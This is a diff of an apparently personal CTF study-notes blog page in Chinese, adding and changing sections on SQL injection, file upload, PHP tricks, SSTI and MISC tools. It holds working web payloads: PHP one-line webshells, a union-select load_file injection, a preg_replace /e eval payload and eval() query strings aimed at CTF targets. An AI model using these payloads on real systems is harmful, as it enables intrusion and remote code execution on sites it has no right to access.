@@ -13,7 +13,7 @@ handler handler_table read next;
 
 payload:
 1&amp;#39;;use supersqli;.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">CTF_Marks</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#show"><span class="toc-text">show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#handler"><span class="toc-text">handler</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%93%E5%BC%80%E5%8F%A5%E6%9F%84"><span class="toc-text">1、打开句柄</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE"><span class="toc-text">2、查看数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87%E6%B3%95"><span class="toc-text">预编译绕过法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-text">修改原查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-text">子查询</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FileUpload"><span class="toc-text">FileUpload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6"><span class="toc-text">.user.ini文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80"><span class="toc-text">后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-text">后缀名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%9B%B8%E5%85%B3"><span class="toc-text">php相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E5%8F%98%E9%87%8F%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">RCE-变量动态调用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hex2bin-%E5%87%BD%E6%95%B0"><span class="toc-text">hex2bin() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base-convert-%E5%87%BD%E6%95%B0"><span class="toc-text">base_convert()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dechex-%E5%87%BD%E6%95%B0"><span class="toc-text">dechex()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-preg-replace"><span class="toc-text">RCE-preg_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text">路径遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP-chains"><span class="toc-text">反序列化 POP chains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup"><span class="toc-text">绕过wakeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9Epublic%E5%B1%9E%E6%80%A7"><span class="toc-text">非public属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5"><span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-get-content"><span class="toc-text">file_get_content()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E7%9B%B8%E5%85%B3"><span class="toc-text">python相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-text">SSTI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%AD%A5%E9%AA%A4"><span class="toc-text">参考步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87"><span class="toc-text">图片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E6%96%87%E4%BB%B6"><span class="toc-text">未知文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">流量分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-1"><span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="toc-text">一些思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyc"><span class="toc-text">pyc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A"><span class="toc-text">方式二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">反编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formost-%E5%88%86%E7%A6%BB%E6%96%87%E4%BB%B6"><span class="toc-text">formost 分离文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#binwalk-%E6%A3%80%E7%B4%A2%E9%9A%90%E5%86%99"><span class="toc-text">binwalk 检索隐写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-text">常见文件头:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Core%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B"><span class="toc-text">Core文件简介</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-text">伪协议：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-text">源码备份</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/ctf"><i class="tag post-item-tag">ctf</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">CTF_Marks</h1><time class="has-text-grey" datetime="2023-11-01T12:16:11.000Z">2023-11-01</time><article class="mt-2 post-content"><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p>
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">CTF_Marks</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#show"><span class="toc-text">show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#handler"><span class="toc-text">handler</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%93%E5%BC%80%E5%8F%A5%E6%9F%84"><span class="toc-text">1、打开句柄</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE"><span class="toc-text">2、查看数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87%E6%B3%95"><span class="toc-text">预编译绕过法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-text">修改原查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-load-file"><span class="toc-text">非预期-load_file</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FileUpload"><span class="toc-text">FileUpload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6"><span class="toc-text">.user.ini文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80"><span class="toc-text">后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-text">后缀名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%9B%B8%E5%85%B3"><span class="toc-text">php相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E5%8F%98%E9%87%8F%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">RCE-变量动态调用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hex2bin-%E5%87%BD%E6%95%B0"><span class="toc-text">hex2bin() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base-convert-%E5%87%BD%E6%95%B0"><span class="toc-text">base_convert()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dechex-%E5%87%BD%E6%95%B0"><span class="toc-text">dechex()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-preg-replace"><span class="toc-text">RCE-preg_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text">路径遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP-chains"><span class="toc-text">反序列化 POP chains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup"><span class="toc-text">绕过wakeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9Epublic%E5%B1%9E%E6%80%A7"><span class="toc-text">非public属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5"><span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96"><span class="toc-text">内容读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83-x3D-x3D"><span class="toc-text">弱比较 &#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E7%9B%B8%E5%85%B3"><span class="toc-text">python相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-text">eval()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%AD%A5%E9%AA%A4"><span class="toc-text">参考步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87"><span class="toc-text">图片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E6%96%87%E4%BB%B6"><span class="toc-text">未知文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">流量分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-1"><span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="toc-text">一些思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyc"><span class="toc-text">pyc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A"><span class="toc-text">方式二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">反编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formost-%E5%88%86%E7%A6%BB%E6%96%87%E4%BB%B6"><span class="toc-text">formost 分离文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#binwalk-%E6%A3%80%E7%B4%A2%E9%9A%90%E5%86%99"><span class="toc-text">binwalk 检索隐写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-text">常见文件头:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Core%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B"><span class="toc-text">Core文件简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E8%A7%A3%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87"><span class="toc-text">分解合并图片</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#montage"><span class="toc-text">montage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gaps"><span class="toc-text">gaps</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Creating-puzzles-from-images"><span class="toc-text">Creating puzzles from images</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Solving-puzzles"><span class="toc-text">Solving puzzles</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Size-detection"><span class="toc-text">Size detection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">压缩包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-text">伪协议：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iconv"><span class="toc-text">iconv:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-text">源码备份</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cyberchef"><span class="toc-text">cyberchef:</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/ctf"><i class="tag post-item-tag">ctf</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">CTF_Marks</h1><time class="has-text-grey" datetime="2023-11-01T12:16:11.000Z">2023-11-01</time><article class="mt-2 post-content"><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p>
 <h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>show databases</p>
 <p>show tables</p>
 <p>当纯数字字符串是表名的时候需要加反引号:</p>
@@ -67,11 +67,13 @@ EXECUTE stmt;#
 <pre><code>query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#39;&quot;.$this-&gt;username.&quot;&#39; and password=&#39;&quot;.$this-&gt;password.&quot;&#39;&quot;);
 </code></pre>
 <p>这里实际相当于注入了一个表</p>
+<h2 id="非预期-load-file"><a href="#非预期-load-file" class="headerlink" title="非预期-load_file"></a>非预期-load_file</h2><pre><code>?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+
+</code></pre>
+<p>如果猜到路径，直接load_file读取</p>
 <h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128071631">【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客</a></p>
 <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;
 &lt;?= eval($_POST[1]);?&gt;
 &lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;
-php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php
 </code></pre>
 <h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><pre><code>&lt;FilesMatch &quot;shell&quot; &gt;
 SetHandler application/x-httpd-php
@@ -196,6 +198,9 @@ payload:
 <p><a target="_blank" rel="noopener" href="https://www.sojson.com/hexconvert/16to10.html">十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)</a></p>
 <h2 id="RCE-preg-replace"><a href="#RCE-preg-replace" class="headerlink" title="RCE-preg_replace"></a>RCE-preg_replace</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p>
 <p>1.&#x2F;e修饰符必不可少<br>2.你必须让 subject 中有 pattern 的匹配。<br>3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本<br>4.满足可变变量的条件</p>
+<p>payload：</p>
+<p>\S*&#x3D;${cmd}</p>
+<p>直接传参\S*&#x3D;${@eval($_POST[‘cmd’])} 就可以蚁剑连接了</p>
 <h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><p>?&#x2F;..&#x2F;flag &#x3D; &#x2F;..&#x2F;flag 这里的问号不会影响</p>
 <h2 id="反序列化-POP-chains"><a href="#反序列化-POP-chains" class="headerlink" title="反序列化 POP chains"></a>反序列化 POP chains</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png" alt="image-20231110111419036"></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120297881">【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客</a></p>
@@ -340,7 +345,13 @@ s878926199a
 </code></pre>
 <pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
 </code></pre>
-<h2 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content()"></a>file_get_content()</h2><p>file_get_content()可以读取php:&#x2F;&#x2F;filter伪协议。</p>
+<h2 id="内容读取"><a href="#内容读取" class="headerlink" title="内容读取"></a>内容读取</h2><p>file_get_content()可以读取php:&#x2F;&#x2F;filter伪协议。</p>
+<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020">file_get_contents</a>、highlight_file() ，show_source()</p>
+<p>readfile(&#x2F;tmp&#x2F;flagoefiu4r93)</p>
+<p>scandir可以扫描目录（需要打印）</p>
+<h2 id="弱比较-x3D-x3D"><a href="#弱比较-x3D-x3D" class="headerlink" title="弱比较 &#x3D;&#x3D;"></a>弱比较 &#x3D;&#x3D;</h2><blockquote>
+<p>使用=&#x3D;比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true=&#x3D;0或true=&#x3D;false或true&#x3D;&#x3D;null）</p>
+</blockquote>
 <h1 id="python相关"><a href="#python相关" class="headerlink" title="python相关"></a>python相关</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>查看config：</p>
  可以获取当前设置，如果题目是这样的：
 
@@ -351,6 +362,26 @@ s878926199a
 <p>同样可以找到 config。</p>
 <pre><code class="python">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;
 </code></pre>
+<h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501">https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501</a></p>
+<p>我们平常的认知都是去写入一句话木马到一个php文件或者是jsp文件，然后连接那个文件的目录，实际上，不需要写入文件，我们照样可以利用eval函数造成一句话的形成最后拿下网站webshell</p>
+<pre><code>&lt;?php
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p><strong>eval()函数在执行时其中有多个函数，则第一个必须执行正确，第一个以后也必须是函数，但是正确与否都可以执行。</strong></p>
+<pre><code>eval(&#39;phpinfo();phpinfo();fdsfsdfds&#39;.&#39;asdasdsa();&#39;);//成功执行
+eval(&#39;asdasdsa();phpinfo();fdsfsdfds&#39;.&#39;asdasdsa();&#39;);//执行失败
+</code></pre>
+<pre><code>http://localhost/12.php?c=@eval($_POST[cmd]);  不行
+</code></pre>
+<pre><code>http://localhost/12.php?c=echo 1;@eval($_POST[cmd]);  行
+</code></pre>
+<p>再第二种情况下，我们可以使用蚁剑连接</p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="参考步骤"><a href="#参考步骤" class="headerlink" title="参考步骤"></a>参考步骤</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><ul>
 <li>查看通道二维码</li>
 <li>查看内嵌文件 stegseek、zsteg 分离 binwalk</li>
@@ -366,9 +397,12 @@ s878926199a
 </li>
 </ul>
 <h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><ul>
-<li>直接find</li>
-<li>提取文件 foremost -t all -i </li>
-<li>过滤本网络查看异常</li>
+<li><p>直接find</p>
+</li>
+<li><p>提取文件 foremost -t all -i </p>
+</li>
+<li><p>过滤本网络查看异常</p>
+</li>
 </ul>
 <h2 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h2><ul>
 <li><p>如果flag存在于流量中，那么把包传入winhex，直接搜索flag等关键字</p>
@@ -442,10 +476,113 @@ MIDI (mid)，文件头：4D546864
 </code></pre>
 <h2 id="Core文件简介"><a href="#Core文件简介" class="headerlink" title="Core文件简介"></a>Core文件简介</h2><p>Core文件其实就是内存的映像，当程序崩溃时，存储内存的相应信息，主用用于对程序进行调试。当程序崩溃时便会产生core文件，其实准确的应该说是core dump 文件,默认生成位置与可执行程序位于同一目录下，文件名为core.<em><strong>,其中</strong></em>是某一数字。</p>
 <p>我们可以使用strings命令查看字符串内容<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>打印文件中可打印的字符</p>
+<h2 id="分解合并图片"><a href="#分解合并图片" class="headerlink" title="分解合并图片"></a>分解合并图片</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1910472">【愚公系列】2021年11月 攻防世界-进阶题-MISC-019(glance-50)-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>kali 的 convert 命令可以分解图片：</p>
+<p>convert glance.gif flag.png</p>
+<p>montage合并图片</p>
+<pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png
+</code></pre>
+<h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><blockquote>
+<ol>
+<li>把当前目录下的所有.png格式的图片拼起来</li>
+</ol>
+<p>montage.exe *.png -geometry +0+0 -background #00000000 big.png</p>
+<ol start="2">
+<li>把当前目录和所有子目录下的.png格式的图片拼起来</li>
+</ol>
+<p>dir &#x2F;b &#x2F;s *.png &gt; filelist.txt<br>montage.exe @filelist.txt -geometry +0+0 -background #00000000 big.png</p>
+<p>拼图时会自动调整行列上的图片数，如果需要指定，加上参数-tile，例:</p>
+<p>dir &#x2F;b &#x2F;s *.png &gt; filelist.txt<br>montage.exe @filelist.txt -geometry +0+0 -tile 2x4 -background #00000000 big.png</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zaffix/article/details/7058587">https://blog.csdn.net/zaffix/article/details/7058587</a></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/89490494">攻防世界-Misc-glance-50(convert分离gif、montage图片拼接)-mma-ctf-2nd-2016-CSDN博客</a></p>
+<blockquote>
+<p>convert glance.gif flag.png</p>
+<p>montage flag*.png -tile x1 -geometry +0+0 flag.png</p>
+<p>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p>
+<p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p>
+</blockquote>
+<h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><blockquote>
+<p>–image 指向拼图的路径</p>
+<p>–size 拼图块的像素尺寸</p>
+<p>–generations 遗传算法的代的数量</p>
+<p>–population 个体数量</p>
+<p>–verbose 每一代训练结束后展示最佳结果</p>
+<p>–save 将拼图还原为图像</p>
+</blockquote>
+<pre><code>gaps --image=test.png --generation=30 --population=300 --size=120
+</code></pre>
